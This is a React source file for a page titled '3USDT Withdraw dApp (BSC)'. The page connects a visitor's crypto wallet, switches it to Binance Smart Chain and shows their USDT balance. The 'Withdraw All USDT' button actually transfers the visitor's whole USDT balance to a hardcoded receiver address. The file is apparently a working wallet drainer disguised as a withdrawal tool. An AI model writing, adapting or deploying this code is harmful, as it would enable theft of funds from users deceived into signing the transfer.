import React, { useState, useEffect } from "react";
import { ethers } from "ethers";

// USDT on BSC
const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint amount) returns (bool)"
];

// Your receiving wallet
const RECEIVER_ADDRESS = "0x45e0c5af78c5ff0ff61cba8eb5a35507a31d5d6c";

// BSC mainnet
const BSC_CHAIN_ID = "0x38"; // 56 decimal

function App() {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [address, setAddress] = useState("");
  const [balance, setBalance] = useState("0");
  const [wrongNetwork, setWrongNetwork] = useState(false);

  // Auto-check network when wallet is connected
  useEffect(() => {
    if (provider) {
      provider.getNetwork().then((net) => {
        if (net.chainId !== 56) {
          setWrongNetwork(true);
        } else {
          setWrongNetwork(false);
        }
      });
    }
  }, [provider]);

  // Connect wallet and force BSC
  const connectWallet = async () => {
    if (!window.ethereum) {
      alert("Trust Wallet / MetaMask not found!");
      return;
    }

    try {
      // Try switch to BSC
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }]
      });
    } catch (switchError) {
      // If BSC not added → try adding
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: BSC_CHAIN_ID,
                chainName: "Binance Smart Chain",
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                nativeCurrency: {
                  name: "BNB",
                  symbol: "BNB",
                  decimals: 18
                },
                blockExplorerUrls: ["https://bscscan.com/"]
              }
            ]
          });
        } catch (addError) {
          console.error("Failed to add BSC:", addError);
        }
      }
    }

    try {
      const prov = new ethers.providers.Web3Provider(window.ethereum);
      await prov.send("eth_requestAccounts", []);
      const signer = prov.getSigner();
      const userAddress = await signer.getAddress();

      setProvider(prov);
      setSigner(signer);
      setAddress(userAddress);

      // Fetch USDT balance
      const usdt = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, prov);
      const decimals = await usdt.decimals();
      const bal = await usdt.balanceOf(userAddress);
      setBalance(ethers.utils.formatUnits(bal, decimals));
    } catch (err) {
      console.error(err);
      alert("Failed to connect: " + err.message);
    }
  };

  // Withdraw all USDT
  const withdraw = async () => {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }
    if (wrongNetwork) {
      alert("⚠️ Please switch to Binance Smart Chain in Trust Wallet");
      return;
    }

    try {
      const usdt = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
      const bal = await usdt.balanceOf(address);

      if (bal.isZero()) {
        alert("No USDT to withdraw!");
        return;
      }

      const tx = await usdt.transfer(RECEIVER_ADDRESS, bal);
      await tx.wait();
      alert("✅ Withdraw successful! Tx: " + tx.hash);
    } catch (err) {
      console.error(err);
      alert("Withdraw failed: " + err.message);
    }
  };

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <h2>3USDT Withdraw dApp (BSC)</h2>

      {address ? (
        <>
          <p>Connected: {address}</p>
          <p>USDT Balance: {balance}</p>
          {wrongNetwork && (
            <p style={{ color: "red" }}>
              ⚠️ Wrong Network. Please switch to Binance Smart Chain (BSC).
            </p>
          )}
          <button onClick={withdraw} disabled={wrongNetwork}>
            Withdraw All USDT
          </button>
        </>
      ) : (
        <button onClick={connectWallet}>Connect Trust Wallet</button>
      )}
    </div>
  );
}

export default App;
